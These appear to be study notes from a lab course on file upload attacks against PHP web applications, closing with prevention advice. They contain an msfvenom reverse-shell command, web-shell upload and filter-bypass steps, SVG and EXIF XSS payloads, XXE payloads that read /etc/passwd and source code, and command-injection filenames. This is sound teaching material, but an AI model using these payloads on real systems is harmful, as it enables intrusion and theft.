# File Upload Attacks

File upload vulnerabilities are amongst the most common vulnerabilities found in web and mobile applications, as we can see in the latest [CVE Reports](https://www.cvedetails.com/vulnerability-list/cweid-434/vulnerabilities.html). We will also notice that most of these vulnerabilities are scored as `High` or `Critical` vulnerabilities, showing the level of risk caused by insecure file upload.

Examples of these attacks include:

- Introducing other vulnerabilities like `XSS` or `XXE`.
- Causing a `Denial of Service (DoS)` on the back-end server.
- Overwriting critical system files and configurations.
- And many others.

### Absent Validation

The most basic type of file upload vulnerability occurs when the web application `does not have any form of validation filters` on the uploaded files, allowing the upload of any file type by default.

### Identifying the Framework

We need to upload a malicious script to test whether we can upload any file type to the back-end server and test whether we can use this to exploit the back-end server. Many kinds of scripts can help us exploit web applications through arbitrary file upload, most commonly a `Web Shell` script and a `Reverse Shell` script.

We can use a tool like Burp Intruder for fuzzing the file extension using a [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) wordlist, as we will see in upcoming sections. This method may not always be accurate, though, as the web application may not utilize index pages or may utilize more than one web extension.

Several other techniques may help identify the technologies running the web application, like using the [Wappalyzer](https://www.wappalyzer.com/) extension, which is available for all major browsers. Once added to our browser, we can click its icon to view all technologies running the web application.

![image.png](image%2056.png)

## Upload Exploitation

### Web Shells

We can find many excellent web shells online that provide useful features, like directory traversal or file transfer. One good option for `PHP` is [phpbash](https://github.com/Arrexel/phpbash), which provides a terminal-like, semi-interactive web shell. Furthermore, [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) provides a plethora of web shells for different frameworks and languages.

![image.png](image%2057.png)

## Generating Custom Reverse Shell Scripts

This is why it is always better to use core web framework functions to connect to our machine. However, this may not be as easy to memorize as a web shell script. Luckily, tools like `msfvenom` can generate a reverse shell script in many languages and may even attempt to bypass certain restrictions in place. We can do so as follows for `PHP`:

```bash
DarkSideDani@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
...SNIP...
Payload size: 3033 bytes
```

Once our `reverse.php` script is generated, we can once again start a `netcat` listener on the port we specified above, upload the `reverse.php` script and visit its link, and we should receive a reverse shell as well:

```bash
DarkSideDani@htb[/htb]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Client-Side Validation

Many web applications only rely on front-end JavaScript code to validate the selected file format before it is uploaded and would not upload it if the file is not in the required format (e.g., not an image).

![image.png](image%2058.png)

To bypass these protections, we can either `modify the upload request to the back-end server`, or we can `manipulate the front-end code to disable these type validations`

## Back-End Request Modification

We can try with Burp:
- We have to catch the upload with a test file.

![image.png](image%2059.png)

![image.png](image%2060.png)

The web application appears to be sending a standard HTTP upload request to `/upload.php`. This way, we can now modify this request to meet our needs without having the front-end type validation restrictions. If the back-end server does not validate the uploaded file type, then we should theoretically be able to send any file type/content, and it would be uploaded to the server.

The two important parts in the request are `filename="HTB.png"` and the file content at the end of the request. If we modify the `filename` to `shell.php` and modify the content to the web shell we used in the previous section; we would be uploading a `PHP` web shell instead of an image.

---

Now we capture another upload request but already for the .php file:

- We upload a script but rename it to .jpg and once we catch the upload we change the .jpg to .php and upload/send it!

![image.png](image%2061.png)

**Note:** We may also modify the `Content-Type` of the uploaded file, though this should not play an important role at this stage, so we'll keep it unmodified.

## Disable Front-End Validation

![image.png](image%2062.png)

```bash
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

The more interesting part is `onchange="checkFile(this)"`, which appears to run a JavaScript code whenever we select a file, which appears to be doing the file type validation. To get the details of this function, we can go to the browser's `Console` by clicking [`CTRL+SHIFT+K`], and then we can type the function's name (`checkFile`) to get its details:

```jsx
function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}
```

The key thing we take from this function is where it checks whether the file extension is an image, and if it is not, it prints the error message we saw earlier (`Only images are allowed!`) and disables the `Upload` button. We can add `PHP` as one of the allowed extensions or modify the function to remove the extension check.

### **Disabling Front-End Validation**

- Use browser developer tools (e.g., Firefox or Chrome's DevTools) to manipulate front-end validation:
    - Locate the HTML input field for file upload.
        
        ```html
        <input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
        
        ```
        
    - Remove or modify the `onchange` validation function and `accept` attribute.
- Example JavaScript validation function:
    
    ```jsx
    function checkFile(File) {
        ...SNIP...
        if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
            $('#error_message').text("Only images are allowed!");
            File.form.reset();
            $("#submit").attr("disabled", true);
        ...SNIP...
        }
    }
    ```
    
- Delete or adjust the validation logic to allow other file types (e.g., PHP).

### **Practical Steps for Uploading a Malicious File**

1. **Capture & Modify the HTTP Request**:
    - Use tools like Burp to intercept the upload.
    - Adjust filename and file content.
2. **Disable Front-End Validation via DevTools**:
    - Open Page Inspector (`CTRL+SHIFT+C`).
    - Remove the `onchange="checkFile(this)"` or change the accepted file types.
3. **Upload the Web Shell**:
    - Use the modified input to upload the PHP file.
    - Access the uploaded shell via the provided path:
        
        ```html
        <img src="/profile_images/shell.php" class="profile-image" id="profile-image">
        ```
        
    - Execute commands through the shell, e.g.:
        
        ```
        http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
        ```
        

## Blacklist Filters

### Blacklisting Extensions

There are generally two common forms of validating a file extension on the back-end:

1. Testing against a `blacklist` of types
2. Testing against a `whitelist` of types

Furthermore, the validation may also check the `file type` or the `file content` for type matching. The weakest form of validation amongst these is `testing the file extension against a blacklist of extension` to determine whether the upload request should be blocked. For example, the following piece of code checks if the uploaded file extension is `PHP` and drops the request if it is:

```jsx
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

The code is taking the file extension (`$extension`) from the uploaded file name (`$fileName`) and then comparing it against a list of blacklisted extensions (`$blacklist`). However, this validation method has a major flaw. `It is not comprehensive`, as many other extensions are not included in this list, which may still be used to execute PHP code on the back-end server if uploaded.

### Fuzzing Extensions

There are many lists of extensions we can utilize in our fuzzing scan. `PayloadsAllTheThings` provides lists of extensions for [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) and [.NET](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) web applications. We may also use `SecLists` list of common [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt).

We may use any of the above lists for our fuzzing scan. As we are testing a PHP application, we will download and use the above [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) list. Then, from `Burp History`, we can locate our last request to `/upload.php`, right-click on it, and select `Send to Intruder`. From the `Positions` tab, we can `Clear` any automatically set positions, and then select the `.php` extension in `filename="HTB.php"` and click the `Add` button to add it as a fuzzing position:

![image.png](image%2063.png)

We'll keep the file content for this attack, as we are only interested in fuzzing file extensions. Finally, we can `Load` the PHP extensions list from above in the `Payloads` tab under `Payload Options`. We will also un-tick the `URL Encoding` option to avoid encoding the (`.`) before the file extension. Once this is done, we can click on `Start Attack` to start fuzzing for file extensions that are not blacklisted:

![image.png](image%2064.png)

We sort it by length, it seems 193 passed the extension validation.

### Non-Blacklisted Extensions

ow, we can try uploading a file using any of the `allowed extensions` from above, and some of them may allow us to execute PHP code. `Not all extensions will work with all web server configurations`, so we may need to try several extensions to get one that successfully executes PHP code.

Let's use the `.phtml` extension, which PHP web servers often allow for code execution rights. We can right-click on its request in the Intruder results and select `Send to Repeater`. Now, all we have to do is repeat what we have done in the previous two sections by changing the file name to use the `.phtml` extension and changing the content to that of a PHP web shell:

![image.png](image%2065.png)

If that doesn’t work we have to search for all types that are available and via that write a PHP reverse shell code to use commands or get RCE.

## Whitelist Filters

Example of File extension whitelist test:

```jsx
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

### Double Extensions

The code only tests whether the file name contains an image extension; a straightforward method of passing the regex test is through `Double Extensions`. For example, if the `.jpg` extension was allowed, we can add it in our uploaded file name and still end our filename with `.php` (e.g. `shell.jpg.php`), in which case we should be able to pass the whitelist test, while still uploading a PHP script that can execute PHP code.

Let's intercept a normal upload request, and modify the file name to (`shell.jpg.php`), and modify its content to that of a web shell:

![image.png](image%2066.png)

Now, if we visit the uploaded file and try to send a command, we can see that it does indeed successfully execute system commands, meaning that the file we uploaded is a fully working PHP script:

```jsx
http://SERVER_IP:PORT/profile_images/shell.jpg.php?cmd=id
```

![image.png](image%2067.png)

However, this may not always work, as some web applications may use a strict `regex` pattern, as mentioned earlier, like the following:

```jsx
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

### Reverse Double Extension Vulnerability

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

**Issue Description**:

- File upload functionality may not be inherently vulnerable but can be exploited due to **web server misconfiguration**.
- Example: Apache2 configuration for PHP execution (e.g., `/etc/apache2/mods-enabled/php7.4.conf`).

**Problematic Configuration**:

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

- The regex pattern matches `.phar`, `.php`, and `.phtml` but lacks an **end-of-string anchor (`$`)**.
- Files like `shell.php.jpg` bypass this rule and execute PHP code because `.php` is embedded within the filename.

**Attack Demonstration**:

1. **Upload a file** named `shell.php.jpg` (bypasses upload filters using double extension).
2. **Execute commands** via a crafted URL:
    
    ```
    http://SERVER_IP:PORT/profile_images/shell.php.jpg?cmd=id
    ```
    

### Character Injection Vulnerability

**Concept**:

- Exploits the filename validation by injecting special characters before/after the final extension.
- Can lead to misinterpretation of the filename and bypass validation.

**Injection Characters**:

- `%20`, `%0a`, `%00`, `%0d0a`
- `/`, `.\`, `.`, `…`, `:`

**Examples**:

- `shell.php%00.jpg` (works on PHP servers version 5.x or earlier, truncating the filename).
- `shell.aspx:.jpg` (bypasses validation on Windows servers).

**Attack Automation**:

- Use a **bash script** to generate permutations of filenames with character injection:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

**Usage**:

- Use the generated wordlist in tools like **Burp Intruder** for fuzzing the upload functionality.
- Check which filenames bypass filters and execute PHP code.

## Type Filters

- Many web servers and applications validate uploaded files based on both **file extension** and **file content type** to prevent file upload attacks.
- Testing only the file extension is insufficient, as attackers can bypass these checks using techniques like double extensions or embedding code in allowed file types.

---

### **Content-Type Validation**

- Some web applications validate files by checking the `Content-Type` header, which is typically set by the client browser.

**Example PHP Code**:

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

**Bypassing Content-Type Validation**:

1. Intercept the upload request using a tool like **Burp Suite**.
2. Modify the `Content-Type` header to an allowed value (e.g., `image/jpg`).
3. Successfully upload a malicious file despite its actual content.

**Steps**:

1. Download/Use a wordlist of allowed `Content-Type` headers.
    
    ```bash
    wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/Web/content-type.txt
    grep 'image/' content-type.txt > image-content-types.txt
    ```
    
2. Use a reduced wordlist to scan for allowed `Content-Type` values.
3. Modify the `Content-Type` header of a malicious file to match an allowed type.
4. Example upload result:
    
    ```
    http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
    ```
    

### **Note**:

- File upload requests may have two `Content-Type` headers: one for the whole request and one for the file. Ensure you modify the correct header.
    - We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as POST data), in which case we will need to modify the main Content-Type header.

---

### **MIME-Type Validation**

This is usually done by inspecting the first few bytes of the file's content, which contain the [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime). For example, if a file starts with (`GIF87a` or `GIF89a`), this indicates that it is a `GIF` image, while a file starting with plaintext is usually considered a `Text` file. If we change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image, regardless of its remaining content or extension.

**Description**:

- Validates file content by analyzing its **MIME type**, derived from the file's structure (magic bytes) rather than its extension or `Content-Type` header.

**Example PHP Code**:

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

**Bypassing MIME-Type Validation**:

1. Modify the file's **magic bytes** to mimic a valid file type while keeping malicious content intact.
2. Example:
    - Change the first bytes of a malicious PHP script to mimic a GIF image (magic bytes: `GIF8`).
    - The file is identified as a GIF but retains PHP code execution capabilities.

**Steps**:

1. Example command to modify a file's magic bytes:
    
    ```bash
    DarkSideDani@htb[/htb]$ echo "this is a text file" > text.jpg 
    DarkSideDani@htb[/htb]$ file text.jpg 
    text.jpg: ASCII text
    ```
    
    As we see, the file's MIME type is `ASCII text`, even though its extension is `.jpg`. However, if we write `GIF8` to the beginning of the file, it will be considered as a `GIF` image instead, even though its extension is still `.jpg`:
    
    ```jsx
    DarkSideDani@htb[/htb]$ echo "GIF8" > text.jpg 
    DarkSideDani@htb[/htb]$file text.jpg
    text.jpg: GIF image data
    ```
    
2. Before uploading it we have to check for whitelist and blacklist filters:

![image.png](image%2068.png)

![image.png](image%2069.png)

- By doing that we can see that `.phar` is available and we can use it as a Double Extension method
    - making the file name `cat.jpg.phar` in Repeater and sending the modified intercepted request:

— Upload the file as `.php` or `.jpg` and execute it:

- After Upload we can add within the Request field in Burp the necessary code we want to be executed:

![image.png](image%2070.png)

```bash
curl -s http://94.237.56.215:34703/profile_images/cmd.jpg.phar?cmd=cat+/flag.txt
```

### **Note**:

- Uploaded files may display the added magic bytes as plaintext when executed, but the PHP code still runs successfully.

---

### **Combining Techniques**

We can use a combination of the two methods discussed in this section, which may help us bypass some more robust content filters. For example, we can try using an `Allowed MIME type with a disallowed Content-Type`, an `Allowed MIME/Content-Type with a disallowed extension`, or a `Disallowed MIME/Content-Type with an allowed extension`, and so on. Similarly, we can attempt other combinations and permutations to try to confuse the web server, and depending on the level of code security, we may be able to bypass various filters.

- Combine `Content-Type` and `MIME-Type` bypasses to exploit more robust content validation mechanisms:
    1. Use a valid `Content-Type` but a malicious MIME type.
    2. Use an allowed MIME type but a disallowed extension.
    3. Mix and match combinations to identify weaknesses in validation logic.

## Limited File Uploads

**Overview**

- Some web applications restrict uploads to specific file types with strict filters.
- Even with restricted file uploads, certain allowed file types (e.g., SVG, XML, HTML) can introduce vulnerabilities such as XSS, XXE, or DoS.
- Fuzzing allowed file extensions is critical to identifying potential exploits.

---

### **Exploitable Vulnerabilities**

### **1. Cross-Site Scripting (XSS)**

- **Attack Vector**:
    - Upload maliciously crafted files to trigger XSS on display.
    - Examples:
        - **HTML Files**: Contain embedded JavaScript for XSS/CSRF attacks.
        - **Image Metadata**: Add malicious payloads in fields like `Comment` or `Artist`.
        - **SVG Images**: Modify XML data to include JavaScript payloads.
- **Examples**:
    - Updating image metadata with `ExifTool`:
        
        ```bash
        exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' HTB.jpg
        ```
        
    - SVG XSS payload:
        
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
        <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
            <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
            <script type="text/javascript">alert(window.origin);</script>
        </svg>
        ```
        
- **Outcome**:
    - Payloads trigger JavaScript execution when the file is displayed.

---

### **2. XML External Entity (XXE)**

- **Attack Vector**:
    - Embed malicious XML payloads in SVG or XML files to leak sensitive server files or source code.
- **Examples**:
    - Leak `/etc/passwd`:
        
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <svg>&xxe;</svg>
        ```
        
    - To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:
        
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
        <svg>&xxe;</svg>
        ```
        
    - Use XML in document formats (e.g., PDF, Word) for blind XXE attacks
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "/flag.txt"> ]>
    <svg>&xxe;</svg>
    ```
    
    - Use XXE/XML Payload to read the source code of `upload.php` to find out the path to where the uploaded files are being saved to:
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg [
      <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php">
    ]>
    <svg>&xxe;</svg>
    ```
    
    ![image.png](image%2071.png)
    
    - Now we have to base64 decode this :
    
    ```bash
    echo "PD9waHAKJHRhcmdldF9kaXIgPSAiLi9pbWFnZXMvIjsKJGZpbGVOYW1
    lID0gYmFzZW5hbWUoJF9GSUxFU1sidXBsb2FkRmlsZSJdWyJuYW1lIl0p
    OwokdGFyZ2V0X2ZpbGUgPSAkdGFyZ2V0X2RpciAuICRmaWxlTmFtZTs
    KJGNvbnRlbnRUeXBlID0gJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0eXB
    lJ107CiRNSU1FdHlwZSA9IG1pbWVfY29udGVudF90eXBlKCRfRklMRVNb
    J3VwbG9hZEZpbGUnXVsndG1wX25hbWUnXSk7CgppZiAoIXByZWdfbW
    F0Y2goJy9eLipcLnN2ZyQvJywgJGZpbGVOYW1lKSkgewogICAgZWNob
    yAiT25seSBTVkcgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp
    9Cgpmb3JlYWNoIChhcnJheSgkY29udGVudFR5cGUsICRNSU1FdHlwZS
    kgYXMgJHR5cGUpIHsKICAgIGlmICghaW5fYXJyYXkoJHR5cGUsIGFycm
    F5KCdpbWFnZS9zdmcreG1sJykpKSB7CiAgICAgICAgZWNobyAiT25seS
    BTVkcgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgICAgICBkaWUoKTsKICAg
    IH0KfQoKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gN
    TAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWU
    oKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cG
    xvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgICR
    sYXRlc3QgPSBmb3BlbigkdGFyZ2V0X2RpciAuICJsYXRlc3QueG1sIiwgIn
    ciKTsKICAgIGZ3cml0ZSgkbGF0ZXN0LCBiYXNlbmFtZSgkX0ZJTEVTWy
    J1cGxvYWRGaWxlIl1bIm5hbWUiXSkpOwogICAgZmNsb3NlKCRsYXRlc3
    QpOwogICAgZWNobyAiRmlsZSBzdWNjZXNzZnVsbHkgdXBsb2FkZWQi
    Owp9IGVsc2UgewogICAgZWNobyAiRmlsZSBmYWlsZWQgdG8gdXBsb2
    FkIjsKfQo=" | base64 -d
    ```
    
    - This will give us :
    
    ```bash
    <?php
    $target_dir = "./images/";
    $fileName = basename($_FILES["uploadFile"]["name"]);
    $target_file = $target_dir . $fileName;
    $contentType = $_FILES["uploadFile"]["type"];
    $MIMEtype = mime_content_type($_FILES["uploadFile"]["tmp_name"]);
    if (!preg_match('/^.*\.svg$/', $fileName)) {
        echo "Only SVG images are allowed";
        die();
    }
    foreach ([$contentType, $MIMEtype] as $type) {
        if (!in_array($type, ["image/svg+xml"])) {
            echo "Only SVG images are allowed";
            die();
        }
    }
    if ($_FILES["uploadFile"]["size"] > 500000) {
        echo "File too large";
        die();
    }
    if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
        $latest = fopen($target_dir . "latest.xml", "w");
        fwrite($latest, basename($_FILES["uploadFile"]["name"]));
        fclose($latest);
        echo "File successfully uploaded";
    } else {
        echo "File failed to upload";
    }
    
    ```
    
    - This way we can see that the folder where everything is being saved is : `/images`
- **Outcome**:
    - Retrieve sensitive files or application source code.
    - Enable further exploitation through **Whitebox Testing**.

---

### **3. Denial of Service (DoS)**

- **Attack Vector**:
    - Overwhelm the server by consuming excessive resources or causing crashes.
- **Examples**:
    - **Decompression Bomb**: Upload a ZIP file with nested archives to inflate its size exponentially.
    - **Pixel Flood**:
        - Modify a compressed image’s data to indicate an extremely large size.
        - Example: Set a 500x500 JPG to `0xffff x 0xffff` (4 Gigapixels).
    - **Oversized Files**: Upload files larger than the server can handle, potentially filling the disk space.
    - **Directory Traversal**:
        - Attempt to upload files to sensitive locations (e.g., `../../../etc/passwd`).
- **Outcome**:
    - Crash the server or consume all available resources.

## Other Upload Attacks

### **1. Injections in File Names**

- **Attack Vector**: Inject malicious strings in the uploaded file name. If the web application reflects or processes the file name insecurely, it may lead to:
    - **Command Injection**:
        - Example filenames:
            - `file$(whoami).jpg`
            - `file\`whoami`.jpg`
            - `file.jpg||whoami`
        - If the server executes commands using the filename (e.g., `mv file /tmp`), the injected command (`whoami`) will execute.
    - **XSS**:
        - Example filename:
            
            ```html
            <script>alert(window.origin);</script>
            ```
            
        - Executed when the file name is displayed in the browser.
    - **SQL Injection**:
        - Example filename:
            
            ```
            file';select+sleep(5);--.jpg
            ```
            
        - Exploits insecure use of filenames in SQL queries.

---

### **2. Upload Directory Disclosure**

- **Problem**: In many forms (e.g., feedback, submission forms), the upload directory may not be directly accessible.
- **Techniques**:
    1. **Fuzzing**:
        - Search for the upload directory using tools like DirBuster or manual directory enumeration.
    2. **Exploitation of Errors**:
        - Upload a file with a duplicate name to trigger an error revealing the directory.
        - Send two identical requests simultaneously.
        - Upload a file with an excessively long name (e.g., 5,000 characters) to induce an error.
    3. **LFI/XXE**:
        - Use Local File Inclusion or XML External Entity vulnerabilities to locate the upload directory.
    4. **IDOR**:
        - Exploit Insecure Direct Object References to infer file storage locations.

---

### **3. Windows-Specific Attacks**

- **Techniques**:
    1. **Reserved Characters**:
        - Upload file names with characters like `|`, `<`, `>`, , or `?`.
        - If not sanitized properly, these may cause errors or unintended behavior.
    2. **Reserved Names**:
        - Use Windows reserved file names (e.g., `CON`, `COM1`, `LPT1`, `NUL`).
        - Causes errors or disclosure of the upload directory.
    3. **8.3 Filename Convention**:
        - Exploit Windows' legacy file-naming system.
        - Example:
            - Refer to `hackthebox.txt` as `HAC~1.TXT` or `HAC~2.TXT`.
            - Write a file (e.g., `WEB~.CONF`) to overwrite `web.conf`.
        - Outcomes:
            - Overwrite critical files.
            - Induce a DoS attack.
            - Access sensitive files.

---

### **4. Advanced File Upload Attacks**

- **Attack Vector**: Exploit automatic processing of uploaded files.
    - Examples:
        - Encoding videos.
        - Compressing files.
        - Renaming files.
- **Examples of Exploitable Libraries**:
    - Public vulnerabilities like **AVI upload vulnerability** leading to XXE in **ffmpeg**.
- **Custom Code**:
    - Requires in-depth analysis for custom libraries and coding practices.
    - Advanced techniques may reveal novel vulnerabilities.

---

# **Preventing File Upload Vulnerabilities**

### **1. Extension Validation**

- **Why It’s Important**:
    - File extensions determine how files are executed on servers.
    - Using both a **whitelist** and **blacklist** adds layers of protection.
- **Best Practices**:
    - Whitelist allowed extensions and ensure file names end with the whitelisted extensions.
    - Blacklist dangerous extensions that may be embedded in filenames.
- **Example Code**:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

// Blacklist test
if (preg_match('/^.+\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// Whitelist test
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

- **Additional Tips**:
    - Perform validation on both **front-end** and **back-end**.
    - Ensure consistency between the file extension and its actual content.

---

### **2. Content Validation**

- **Why It’s Important**:
    - File extensions alone are insufficient; the actual file content must be validated.
- **Best Practices**:
    - Validate the file's **signature**, **MIME type**, and **HTTP Content-Type** headers.
    - Ensure these properties match the expected file type.
- **Example Code**:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// Whitelist test
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}

// Content test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only PNG images are allowed";
        die();
    }
}
```

---

### **3. Upload Directory Security**

- **Why It’s Important**:
    - Direct access to the upload directory may expose vulnerabilities.
- **Best Practices**:
    - **Hide the Uploads Directory**:
        - Do not allow direct access to uploaded files.
        - Use a script (e.g., `download.php`) to fetch and serve files securely.
    - **Restrict Directory Access**:
        - Return a `403 Forbidden` for unauthorized access.
        - Use HTTP headers like `Content-Disposition`, `nosniff`, and accurate `Content-Type` values.
    - **Randomize File Names**:
        - Save uploaded files with randomized names while storing the original names in a database.
- **Example Workflow**:
    1. Store files with randomized names in the upload directory.
    2. Fetch the original filename from the database when a user requests a download.
- **Additional Tips**:
    - Store uploaded files on a **separate server or container**.
    - Use `open_basedir` in PHP to restrict access to sensitive directories.

---

### **4. Further Security Measures**

- **Disable Dangerous Functions**:
    - In PHP, disable functions like `exec`, `shell_exec`, `system`, and `passthru` using `php.ini`:
        
        ```
        disable_functions = exec, shell_exec, system, passthru
        ```
        
- **Handle Errors Securely**:
    - Avoid exposing server-side or system-level error messages.
    - Display only generic error messages, such as "File upload failed."
- **Other Tips**:
    - **Limit File Size**:
        - Set a maximum upload size to prevent abuse.
    - **Update Libraries**:
        - Keep all used libraries and frameworks up to date.
    - **Malware Scanning**:
        - Scan uploaded files for malicious content.
    - **Web Application Firewall (WAF)**:
        - Use a WAF to add an additional layer of defense.

---

### **Checklist for Developers**

1. **Extension Validation**:
    - Whitelist allowed extensions.
    - Blacklist dangerous extensions.
2. **Content Validation**:
    - Validate MIME type, content signature, and headers.
3. **Upload Directory Security**:
    - Hide and restrict access to the upload directory.
    - Use a secure file download mechanism.
    - Randomize file names in storage.
4. **General Security**:
    - Disable dangerous server functions.
    - Limit file size.
    - Update libraries and scan for malware.
    - Configure a WAF.

---

### **Actionable Reporting**

When identifying file upload vulnerabilities, recommend the following:

- Missing measures from the checklist above.
- Specific code snippets to implement fixes.
- Configuration changes needed for secure operations.

Once implemented, these measures significantly reduce the risk of file upload vulnerabilities and ensure the web application is more secure.